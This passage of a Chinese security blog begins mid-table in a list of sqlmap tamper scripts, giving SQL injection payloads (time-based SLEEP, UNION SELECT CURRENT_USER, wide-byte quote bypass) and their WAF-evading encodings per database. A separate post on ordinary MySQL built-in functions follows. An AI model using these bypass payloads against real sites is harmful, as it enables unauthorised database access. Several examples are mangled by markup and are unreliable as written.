<td>2</td>
<td>base64encode.py</td>
<td>用base64编码替换</td>
<td>(“1’ AND SLEEP(5)#”) ‘MScgQU5EIFNMRUVQKDUpIw==’</td>
</tr>
<tr>
<td>all</td>
<td>3</td>
<td>multiplespaces.py</td>
<td>围绕SQL关键字添加多个空格</td>
<td>(‘1 UNION SELECT foobar’) ‘1    UNION     SELECT   foobar’</td>
</tr>
<tr>
<td>all</td>
<td>4</td>
<td>space2plus.py</td>
<td>用+替换空格</td>
<td>(‘SELECT id FROM users’) ‘SELECT+id+FROM+users’</td>
</tr>
<tr>
<td>all</td>
<td>5</td>
<td>nonrecursivereplacement.py</td>
<td>双重查询语句。取代predefined SQL关键字with表示  suitable for替代（例如  .replace（“SELECT”、””)） filters</td>
<td>(‘1 UNION SELECT 2–’) ‘1 UNIOUNIONN SELESELECTCT 2–’</td>
</tr>
<tr>
<td>all</td>
<td>6</td>
<td>space2randomblank.py</td>
<td>代替空格字符（“”）从一个随机的空 白字符可选字符的有效集</td>
<td>(‘SELECT id FROM users’) ‘SELECT%0Did%0DFROM%0Ausers’</td>
</tr>
<tr>
<td>all</td>
<td>7</td>
<td>unionalltounion.py</td>
<td>替换UNION ALL SELECT UNION SELECT</td>
<td>(‘-1 UNION ALL SELECT’) ‘-1 UNION SELECT’</td>
</tr>
<tr>
<td>all</td>
<td>8</td>
<td>securesphere.py</td>
<td>追加特制的字符串</td>
<td>(‘1 AND 1=1’) “1 AND 1=1 and ‘0having’=’0having’”</td>
</tr>
<tr>
<td>mssql</td>
<td>1</td>
<td>space2hash.py</td>
<td>绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td>
<td>‘1 AND 9227=9227’  ‘1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227’</td>
</tr>
<tr>
<td>mssql</td>
<td>2</td>
<td>equaltolike.py</td>
<td>like 代替等号</td>
<td>* Input: SELECT * FROM users WHERE id=1  2 * Output: SELECT * FROM users WHERE id LIKE 1</td>
</tr>
<tr>
<td>mssql</td>
<td>3</td>
<td>space2mssqlblank.py(mssql)</td>
<td>空格替换为其它空符号</td>
<td>Input: SELECT id FROM users Output: SELECT%08id%02FROM%0Fusers</td>
</tr>
<tr>
<td>mssql</td>
<td>4</td>
<td>space2mssqlhash.py</td>
<td>替换空格</td>
<td>(‘1 AND 9227=9227’) ‘1%23%0AAND%23%0A9227=9227’</td>
</tr>
<tr>
<td>mssql</td>
<td>5</td>
<td>between.py</td>
<td>用between替换大于号（&gt;）</td>
<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
</tr>
<tr>
<td>mssql</td>
<td>6</td>
<td>percentage.py</td>
<td>asp允许每个字符前面添加一个%号</td>
<td>* Input: SELECT FIELD FROM TABLE * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
</tr>
<tr>
<td>mssql</td>
<td>7</td>
<td>sp_password.py</td>
<td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td>
<td>(‘1 AND 9227=9227– ‘) ‘1 AND 9227=9227– sp_password’</td>
</tr>
<tr>
<td>mssql</td>
<td>8</td>
<td>charencode.py</td>
<td>url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
</tr>
<tr>
<td>mssql</td>
<td>9</td>
<td>randomcase.py</td>
<td>随机大小写</td>
<td>* Input: INSERT * Output: InsERt</td>
</tr>
<tr>
<td>mssql</td>
<td>10</td>
<td>charunicodeencode.py</td>
<td>字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
</tr>
<tr>
<td>mssql</td>
<td>11</td>
<td>space2comment.py</td>
<td>Replaces space character (‘ ‘) with comments ‘/**/’</td>
<td>* Input: SELECT id FROM users * Output: SELECT//id//FROM/**/users</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>1</td>
<td>equaltolike.py</td>
<td>like 代替等号</td>
<td>* Input: SELECT * FROM users WHERE id=1  2 * Output: SELECT * FROM users WHERE id LIKE 1</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>2</td>
<td>greatest.py</td>
<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
<td>(‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)=A’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>3</td>
<td>apostrophenullencode.py</td>
<td>绕过过滤双引号，替换字符和双引号。</td>
<td>tamper(“1 AND ‘1’=’1”)  ‘1 AND %00%271%00%27=%00%271’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>4</td>
<td>ifnull2ifisnull.py</td>
<td>绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td>
<td>(‘IFNULL(1, 2)’) ‘IF(ISNULL(1),2,1)’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>5</td>
<td>space2mssqlhash.py</td>
<td>替换空格</td>
<td>(‘1 AND 9227=9227’) ‘1%23%0AAND%23%0A9227=9227’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>6</td>
<td>modsecurityversioned.py</td>
<td>过滤空格，包含完整的查询版本注释</td>
<td>(‘1 AND 2&gt;1–’) ‘1 /<em>!30874AND 2&gt;1</em>/–’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>7</td>
<td>space2mysqlblank.py</td>
<td>空格替换其它空白符号(mysql)</td>
<td>Input: SELECT id FROM users Output: SELECT%0Bid%0BFROM%A0users</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>8</td>
<td>between.py</td>
<td>用between替换大于号（&gt;）</td>
<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>9</td>
<td>modsecurityzeroversioned.py</td>
<td>包含了完整的查询与零版本注释</td>
<td>(‘1 AND 2&gt;1–’) ‘1 /<em>!00000AND 2&gt;1</em>/–’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>10</td>
<td>space2mysqldash.py</td>
<td>替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td>
<td>(‘1 AND 9227=9227’) ‘1–%0AAND–%0A9227=9227’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>11</td>
<td>bluecoat.py</td>
<td>代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</td>
<td>(‘SELECT id FROM users where id = 1’) ‘SELECT%09id FROM users where id LIKE 1’</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>12</td>
<td>percentage.py</td>
<td>asp允许每个字符前面添加一个%号</td>
<td>* Input: SELECT FIELD FROM TABLE * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>13</td>
<td>charencode.py</td>
<td>url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>14</td>
<td>randomcase.py</td>
<td>随机大小写</td>
<td>* Input: INSERT * Output: InsERt</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>15</td>
<td>versionedkeywords.py</td>
<td>Encloses each non-function keyword with versioned MySQL comment</td>
<td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# * Output: 1/<em>!UNION<strong>!ALL</strong>!SELECT**!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS**!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>16</td>
<td>space2comment.py</td>
<td>Replaces space character (‘ ‘) with comments ‘/**/’</td>
<td>* Input: SELECT id FROM users * Output: SELECT//id//FROM/**/users</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>17</td>
<td>charunicodeencode.py</td>
<td>字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
</tr>
<tr>
<td>mysql &gt;= 5.1.13</td>
<td>18</td>
<td>versionedmorekeywords.py</td>
<td>注释绕过</td>
<td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# * Output: 1/<em>!UNION<strong>!ALL</strong>!SELECT**!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS**!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</td>
</tr>
<tr>
<td>MySQL &lt; 5.1</td>
<td>19</td>
<td>halfversionedmorekeywords.py</td>
<td>关键字前加注释</td>
<td>* Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa * Output: value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)), NULL, NULL#/</em>!0AND ‘QDWa’=’QDWa</td>
</tr>
<tr>
<td>MySQL &lt; 5.1</td>
<td>20</td>
<td>halfversionedmorekeywords.py</td>
<td>当数据库为mysql时绕过防火墙，每个关键字之前添加 mysql版本评论</td>
<td>1.(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”) 2.”value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa”</td>
</tr>
<tr>
<td>MySQL &gt;= 5.1.13</td>
<td>21</td>
<td>space2morehash.py</td>
<td>空格替换为 #号 以及更多随机字符串 换行符</td>
<td>* Input: 1 AND 9227=9227 * Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</td>
</tr>
<tr>
<td>Oracle</td>
<td>1</td>
<td>greatest.py</td>
<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
<td>(‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)=A’</td>
</tr>
<tr>
<td>Oracle</td>
<td>2</td>
<td>apostrophenullencode.py</td>
<td>绕过过滤双引号，替换字符和双引号。</td>
<td>tamper(“1 AND ‘1’=’1”)  ‘1 AND %00%271%00%27=%00%271’</td>
</tr>
<tr>
<td>Oracle</td>
<td>3</td>
<td>between.py</td>
<td>用between替换大于号（&gt;）</td>
<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
</tr>
<tr>
<td>Oracle</td>
<td>4</td>
<td>charencode.py</td>
<td>url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
</tr>
<tr>
<td>Oracle</td>
<td>5</td>
<td>randomcase.py</td>
<td>随机大小写</td>
<td>* Input: INSERT * Output: InsERt</td>
</tr>
<tr>
<td>Oracle</td>
<td>6</td>
<td>charunicodeencode.py</td>
<td>字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
</tr>
<tr>
<td>Oracle</td>
<td>7</td>
<td>space2comment.py</td>
<td>Replaces space character (‘ ‘) with comments ‘/**/’</td>
<td>* Input: SELECT id FROM users * Output: SELECT//id//FROM/**/users</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>1</td>
<td>greatest.py</td>
<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
<td>(‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)=A’</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>2</td>
<td>apostrophenullencode.py</td>
<td>绕过过滤双引号，替换字符和双引号。</td>
<td>tamper(“1 AND ‘1’=’1”)  ‘1 AND %00%271%00%27=%00%271’</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>3</td>
<td>between.py</td>
<td>用between替换大于号（&gt;）</td>
<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>4</td>
<td>percentage.py</td>
<td>asp允许每个字符前面添加一个%号</td>
<td>* Input: SELECT FIELD FROM TABLE * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>5</td>
<td>charencode.py</td>
<td>url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>6</td>
<td>randomcase.py</td>
<td>随机大小写</td>
<td>* Input: INSERT * Output: InsERt</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>7</td>
<td>charunicodeencode.py</td>
<td>字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>8</td>
<td>space2comment.py</td>
<td>Replaces space character (‘ ‘) with comments ‘/**/’</td>
<td>* Input: SELECT id FROM users * Output: SELECT//id//FROM/**/users</td>
</tr>
<tr>
<td>Access</td>
<td>1</td>
<td>appendnullbyte.py</td>
<td>在有效负荷结束位置加载零字节字符编码</td>
<td>(‘1 AND 1=1’) ‘1 AND 1=1%00’</td>
</tr>
<tr>
<td>其他</td>
<td>1</td>
<td>chardoubleencode.py</td>
<td>双url编码(不处理以编码的)</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</td>
</tr>
<tr>
<td>其他</td>
<td>2</td>
<td>unmagicquotes.py</td>
<td>宽字符绕过 GPC  addslashes</td>
<td>* Input: 1′ AND 1=1 * Output: 1%bf%27 AND 1=1–%20</td>
</tr>
<tr>
<td>其他</td>
<td>3</td>
<td>randomcomments.py</td>
<td>用/**/分割sql关键字</td>
<td>‘INSERT’ becomes ‘IN//S//ERT’</td>
</tr>
</tbody></table>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="http://www.langzi.fun/Python%20%E6%89%B9%E9%87%8FSQL%E6%B3%A8%E5%85%A5%E6%89%AB%E6%8F%8F.html" target="_blank" rel="noopener">http://www.langzi.fun/Python%20%E6%89%B9%E9%87%8FSQL%E6%B3%A8%E5%85%A5%E6%89%AB%E6%8F%8F.html</a></p>
<p><a href="https://blog.csdn.net/whatday/article/details/54774043" target="_blank" rel="noopener">https://blog.csdn.net/whatday/article/details/54774043</a></p>
<p><a href="https://www.freebuf.com/articles/web/34619.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/34619.html</a></p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/09/MySql内置函数学习-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/09/MySql内置函数学习-4/" itemprop="url">MySql内置函数学习------第四周学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-09T16:55:34+08:00">
                2019-09-09
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/09/09/MySql内置函数学习-4/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/09/09/MySql内置函数学习-4/" class="cy_cmt_count" data-xid="2019/09/09/MySql内置函数学习-4/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/09/09/MySql内置函数学习-4/" class="leancloud_visitors" data-flag-title="MySql内置函数学习------第四周学习">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h2 id="MySql内置函数学习——第四周学习"><a href="#MySql内置函数学习——第四周学习" class="headerlink" title="MySql内置函数学习——第四周学习"></a>MySql内置函数学习——第四周学习</h2><p>mysql含有的内置函数分别为<strong>字符串函数、数字函数、日期函数、类型转换函数、流程控制函数</strong>。</p>
<h5 id="1-字符串函数"><a href="#1-字符串函数" class="headerlink" title="1.字符串函数"></a>1.字符串函数</h5><p>1.1 查询ascii码的函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ascii(1);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566366553415.png" alt="1566366553415"></p>
<p>1.2 拼接字符串concat</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat (&apos;Hello&apos;,&apos;Word!&apos;);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566367120384.png" alt="1566367120384"></p>
<p>1.3 查看字符串长度length</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select length (&apos;12314566&apos;);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566367237274.png" alt="1566367237274"></p>
<p>1.4 截取字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select left (str,len); 返回str左边的前len个字符</span><br><span class="line">select left (&apos;hello word!&apos;,5);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566367412322.png" alt="1566367412322"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select right(str,len);返回str右边的后Len字符</span><br><span class="line">select right(&apos;hello word!&apos;,5);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566367618749.png" alt="1566367618749"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substring(str,pos,len);返回str的pos位置起的len个字符，substring后面严禁加空格</span><br><span class="line">select substring(&apos;hello word&apos;,5,5);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566368883258.png" alt="1566368883258"></p>
<p>1.5 去除空格</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ltrim(&apos; abc dve d &apos;);返回删除左空格的字符串str</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566369137825.png" alt="1566369137825"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rtrim(&apos; abc dve d &apos;);返回删除右空格的字符串str</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566369294596.png" alt="1566369294596"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select trim(方向,remstr from str);返回从某侧remstr后的字符串，方向词包括both（两侧），leading(左侧),trailing(右侧)；</span><br><span class="line">select trim(leading,&apos;a&apos;from&apos;aaaabbbbdcddaaa&apos;);删除左侧所有a的，并输出字符串</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566370808186.png" alt="1566370808186"></p>
<p>1.6 返回有N个空格组成的字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select space(5);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566370903245.png" alt="1566370903245"></p>
<p>1.7 大小写转换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select lower(&apos;MYSQL&apos;);转换为小写</span><br><span class="line">select upper(&apos;mysql&apos;);转换为大写</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566371081414.png" alt="1566371081414"></p>
<h5 id="2-数字函数"><a href="#2-数字函数" class="headerlink" title="2.数字函数"></a>2.数字函数</h5><p>2.1 ceil(n)返回大于n最大的整数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ceil(100.1)from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566371906811.png" alt="1566371906811"></p>
<p>2.2 floor(n)返回小于n的最大整数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(100.1)from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566372138107.png" alt="1566372138107"></p>
<p>2.3 rand()返回0到1的随机数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand() from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566372388262.png" alt="1566372388262"></p>
<p>2.4 round(n,y)将n四舍五入保留y小数位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select round(10.12524,2);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566372634987.png" alt="1566372634987"></p>
<p>2.5 truncate(n,y)将n保留y位小数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select truncate(10.12524,2);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566372739032.png" alt="1566372739032"></p>
<h5 id="3-日期类函数"><a href="#3-日期类函数" class="headerlink" title="3. 日期类函数"></a>3. 日期类函数</h5><p>3.1 now()返回当前日期时间</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select now() from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566372853204.png" alt="1566372853204"></p>
<p>3.2 curdate()返回当前日期</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select curdate() from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566372933917.png" alt="1566372933917"></p>
<p>3.3 curtime()返回当前时间</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select curtime() from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566372995731.png" alt="1566372995731"></p>
<p>3.4 week(data)返回日期为一年中的第几周</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select week(&apos;2019-08-21&apos;);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566373439359.png" alt="1566373439359"></p>
<p>3.5 year(data)返回日期中的年</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select year(&apos;2019-08-21&apos;);</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566373618525.png" alt="1566373618525"></p>
<p>3.6 date_format(s,parrern)格式化日期</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select date_format(now(),&apos;%y%m%d&apos;) from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566373960420.png" alt="1566373960420"></p>
<p><strong>注：</strong>%y  表示两位数字年份。例如：（2017返回17）<br>%Y 表示四位数字年份。例如：（2017返回2017）<br>%m 表示两位数字月份。例如：（01,02，….，12）<br>%c  表示数字的月份。例如：（1,2,3,4…..,12）<br>%M 表示月明，英文名称。<br>%d  表示两位数字的天数。例如：（01,02,03,…..31）<br>%e 表示数字的天数。例如（1,2,3,4,…..,31）<br>%H 表示两位数字的小时数，24小时制。例如：（01,02，…..，24）<br>%i  表示两位数字的分钟数。例如：（01,02…,60）<br>%S %s 表示两位数字的秒数。例如：（01,02…,60）</p>
<p>3.7 datediff(d1,d2)返回d1与d2相差的天数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select datediff(&apos;2019-08-21&apos;,&apos;2019-07-31&apos;) from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566374218864.png" alt="1566374218864"></p>
<p>3.8 to_days(data)返回data从0年来的天数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select to_days(&apos;2019-08-21&apos;) from dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1566374386478.png" alt="1566374386478"></p>
